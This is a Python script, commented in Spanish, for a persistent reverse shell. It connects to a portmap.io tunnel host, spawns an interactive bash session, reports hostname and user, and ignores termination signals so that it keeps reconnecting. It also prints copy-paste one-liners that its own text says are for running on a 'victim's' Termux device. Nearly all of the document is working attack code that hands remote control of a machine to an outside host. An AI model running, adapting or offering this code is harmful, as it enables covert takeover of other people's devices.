#!/usr/bin/env python3
"""
▓█████▄  ██▀███   █    ██  ██▓ ▄▄▄▄    ██▓███   ██▓    ▄▄▄     ▓██   ██▓
▒██▀ ██▌▓██ ▒ ██▒ ██  ▓██▒▓██▒▓█████▄ ▓██░  ██▒▓██▒   ▒████▄    ▒██  ██▒
░██   █▌▓██ ░▄█ ▒▓██  ▒██░▒██▒▒██▒ ▄██▓██░ ██▓▒▒██░   ▒██  ▀█▄   ▒██ ██░
░▓█▄   ▌▒██▀▀█▄  ▓▓█  ░██░░██░▒██░█▀  ▒██▄█▓▒ ▒▒██░   ░██▄▄▄▄██  ░ ▐██▓░
░▒████▓ ░██▓ ▒██▒▒▒█████▓ ░██░░▓█  ▀█▓▒██▒ ░  ░░██████▒▓█   ▓██▒ ░ ██▒▓░
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ░▓  ░▒▓███▀▒▒▓▒░ ░  ░░ ▒░▓  ░▒▒   ▓▒█░  ██▒▒▒
 ░ ▒  ▒   ░▒ ░ ▒░░░▒░ ░ ░  ▒ ░▒░▒   ░ ░▒ ░     ░ ░ ▒  ░ ▒   ▒▒ ░▓██ ░▒░
 ░ ░  ░   ░░   ░  ░░░ ░ ░  ▒ ░ ░    ░ ░░         ░ ░    ░   ▒   ▒ ▒ ░░
   ░       ░        ░      ░   ░                   ░  ░     ░  ░░ ░
 ░                              ░                             ░  ░ ░
                REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
           TCP://Astrazam-37147.portmap.host:37147 => 8081
           ¡CONEXIÓN INTERACTIVA CON PTY Y RECONEXIÓN!
"""

import socket
import subprocess
import os
import time
import sys
import platform
import pty
import signal
import select
import fcntl
import termios
import struct
from datetime import datetime

# ===== CONFIGURACIÓN =====
HOST = "Astrazam-37147.portmap.host"  # Tu URL de Portmap
PORT = 37147                           # Puerto público
RECONNECT_DELAY = 2                    # Segundos entre reconexiones
MAX_RECONNECT_ATTEMPTS = 99999         # Intentos infinitos
# =========================

class UltraStableReverseShell:
    def __init__(self):
        self.session_start = time.time()
        self.connection_count = 0
        self.running = True
        
        # Ignorar señales que puedan interrumpir
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGHUP, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Manejar señales para evitar que la shell se cierre"""
        print(f"\n[!] Señal {signum} recibida - Ignorando...")
        return  # No hacer nada, solo ignorar

    def set_nonblocking(self, fd):
        """Configurar file descriptor como no bloqueante"""
        try:
            fl = fcntl.fcntl(fd, fcntl.F_GETFL)
            fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)
        except:
            pass

    def spawn_interactive_shell(self, sock):
        """Crear una shell completamente interactiva con PTY"""
        try:
            # Crear PTY maestro/esclavo
            master, slave = pty.openpty()
            
            # Configurar el terminal
            attrs = termios.tcgetattr(slave)
            attrs[3] = attrs[3] & ~termios.ECHO  # Sin eco
            termios.tcsetattr(slave, termios.TCSANOW, attrs)
            
            # Obtener el shell correcto para el sistema
            if os.path.exists('/data/data/com.termux'):
                shell = "/data/data/com.termux/files/usr/bin/bash"
                shell_cmd = [shell, "-i"]
            else:
                shell = "/bin/bash"
                shell_cmd = [shell, "-i", "--norc"]
            
            # Fork para ejecutar la shell
            pid = os.fork()
            
            if pid == 0:  # Proceso hijo
                # Cerrar el maestro
                os.close(master)
                
                # Hacer el esclavo nuestro terminal controlador
                os.dup2(slave, 0)
                os.dup2(slave, 1)
                os.dup2(slave, 2)
                
                # Configurar el grupo de procesos
                os.setsid()
                os.tcsetpgrp(slave, os.getpgid(0))
                
                # Variables de entorno para terminal
                os.environ['TERM'] = 'xterm-256color'
                os.environ['COLORTERM'] = 'truecolor'
                os.environ['PS1'] = '\\[\\033[1;32m\\]\\u@\\h:\\w\\$\\[\\033[0m\\] '
                
                # Ejecutar shell
                os.execvp(shell, shell_cmd)
            
            else:  # Proceso padre
                os.close(slave)
                
                # Configurar no bloqueante
                self.set_nonblocking(master)
                self.set_nonblocking(sock)
                
                # Bucle principal de transferencia de datos
                while True:
                    try:
                        rlist, _, _ = select.select([master, sock], [], [], 1)
                        
                        for r in rlist:
                            if r == master:
                                data = os.read(master, 1024)
                                if data:
                                    sock.sendall(data)
                            elif r == sock:
                                data = sock.recv(1024)
                                if data:
                                    # Enviar datos al master PTY
                                    os.write(master, data)
                                    # Forzar flush
                                    try:
                                        termios.tcdrain(master)
                                    except:
                                        pass
                                else:
                                    # Conexión cerrada
                                    return False
                    
                    except (OSError, socket.error, KeyboardInterrupt):
                        # Ignorar errores y continuar
                        continue
                    
                    except Exception as e:
                        print(f"[!] Error en PTY: {e}")
                        time.sleep(1)
        
        except Exception as e:
            print(f"[!] Error en spawn_interactive_shell: {e}")
            return False
        
        return True

    def connect_and_spawn_shell(self):
        """Conectar y lanzar shell interactiva"""
        attempt = 0
        
        while self.running and attempt < MAX_RECONNECT_ATTEMPTS:
            attempt += 1
            
            try:
                print(f"\n[+] 🔄 Intento {attempt} - Conectando a {HOST}:{PORT}")
                
                # Crear socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(15)
                
                # Conectar
                sock.connect((HOST, PORT))
                sock.settimeout(None)  # Sin timeout después de conectar
                
                self.connection_count += 1
                print(f"[+] ✅ Conexión #{self.connection_count} establecida!")
                print(f"[+] 🕐 Hora: {datetime.now().strftime('%H:%M:%S')}")
                
                # Enviar banner de bienvenida
                welcome = f"""
{'='*60}
🚀 SHELL REMOTA ULTRA ESTABLE - CONECTADA
{'='*60}
Host: {socket.gethostname()}
User: {os.getenv('USER', 'unknown')}
Platform: {platform.system()} {platform.release()}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Session: #{self.connection_count}
{'='*60}

📟 Shell interactiva lista - Escribe comandos:
                """
                sock.sendall(welcome.encode())
                
                # Lanzar shell interactiva
                shell_ok = self.spawn_interactive_shell(sock)
                
                # Si llegamos aquí, la shell terminó
                sock.close()
                
                if shell_ok:
                    print(f"\n[-] 🔄 Shell cerrada - Reconectando en {RECONNECT_DELAY}s...")
                else:
                    print(f"\n[-] ⚠️  Error en shell - Reconectando...")
                
                time.sleep(RECONNECT_DELAY)
                
            except socket.timeout:
                print("[-] ⏱️  Timeout - Reintentando...")
                time.sleep(RECONNECT_DELAY)
                
            except ConnectionRefusedError:
                print("[-] ❌ Conexión rechazada - Verifica portmap.io")
                time.sleep(RECONNECT_DELAY * 2)
                
            except KeyboardInterrupt:
                print("\n\n[!] Interrumpido por usuario - Manteniendo conexión...")
                # No salir, continuar en el bucle
                time.sleep(1)
                
            except Exception as e:
                print(f"[-] ⚠️  Error: {str(e)[:50]}...")
                time.sleep(RECONNECT_DELAY)

    def show_banner(self):
        """Mostrar banner de inicio"""
        banner = f"""
{'='*60}
🔥 REVERSE SHELL ULTRA ESTABLE - PORTMAP.IO
{'='*60}
🌍 URL Pública: {HOST}:{PORT}
👤 Usuario: {os.getenv('USER', 'unknown')}
📱 Platform: {'Termux/Android' if os.path.exists('/data/data/com.termux') else platform.system()}
📦 Python: {platform.python_version()}
⏰ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔧 Modo: PTY Interactivo Completo
🔄 Reconexión: Automática (delay: {RECONNECT_DELAY}s)
{'='*60}
[+] Esta shell incluye:
    • PTY interactiva completa
    • Soporte para Ctrl+C, Ctrl+Z
    • Manejo de flechas y historial
    • Colores y prompt personalizado
    • Reconexión automática infinita
    • Ignorar señales de interrupción
{'='*60}
        """
        print(banner)

    def run(self):
        """Ejecutar shell inversa ultra estable"""
        try:
            self.show_banner()
            print("[*] 🚀 Iniciando conexión ultra estable...")
            print("[*] 💡 Presiona Ctrl+\\ para salir completamente")
            print("[*] 🔧 Conectando a portmap.io...\n")
            
            self.connect_and_spawn_shell()
            
        except KeyboardInterrupt:
            print("\n\n[+] ✅ Shell finalizada por usuario")
            self.running = False
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] Error crítico: {e}")
            print("[!] Reiniciando en 5 segundos...")
            time.sleep(5)
            self.run()  # Reiniciar

# ===== VERSIÓN ONE-LINER MEJORADA =====
ONE_LINER = '''python3 -c "import socket,os,pty,time,subprocess,signal,fcntl,termios,select;signal.signal(signal.SIGINT,lambda *a:None);h='Astrazam-37147.portmap.host';p=37147;sh='/data/data/com.termux/files/usr/bin/bash' if os.path.exists('/data/data/com.termux') else '/bin/bash';os.environ.update({'TERM':'xterm','PS1':'\\\\[\\\\033[1;31m\\\\]rev-shell\\\\[\\\\033[0m\\\\]:\\\\w\\\\$ '});while True: try: s=socket.socket();s.connect((h,p));print('[+] Connected');m,sl=pty.openpty();pid=os.fork();[os.close(sl),os.dup2(m,0),os.dup2(m,1),os.dup2(m,2),os.setsid(),os.tcsetpgrp(m,os.getpgid(0)),os.execvp(sh,[sh,'-i','--norc'])] if pid==0 else [os.close(sl),[fcntl.fcntl(f,fcntl.F_SETFL,fcntl.fcntl(f,fcntl.F_GETFL)|os.O_NONBLOCK) for f in (m,s)],[[(r==m and s.send(os.read(m,4096))) or (r==s and os.write(m,s.recv(4096)))] for r,_,_ in [select.select([m,s],[],[],1)] for _ in r] while s.fileno()>=0];s.close();time.sleep(2) except: time.sleep(2)"'''

# ===== EJECUCIÓN =====
if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "oneliner":
        print("\n📋 ONE-LINER ULTRA COMPACTO PARA COPIAR Y PEGAR:")
        print("-" * 70)
        print(ONE_LINER)
        print("-" * 70)
        print("\n📝 Para usar: Copia y pega esto en Termux (víctima)")
        print("   La shell se mantendrá viva y se reconectará automáticamente")
    elif len(sys.argv) > 1 and sys.argv[1] == "simple":
        # Versión simple para sistemas limitados
        SIMPLE_ONE_LINER = '''while true; do python3 -c "import socket,os,pty;s=socket.socket();s.connect(('Astrazam-37147.portmap.host',37147));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"; sleep 2; done'''
        print("\n📋 VERSIÓN SIMPLE (para sistemas con menos recursos):")
        print("-" * 70)
        print(SIMPLE_ONE_LINER)
        print("-" * 70)
    else:
        shell = UltraStableReverseShell()
        shell.run()
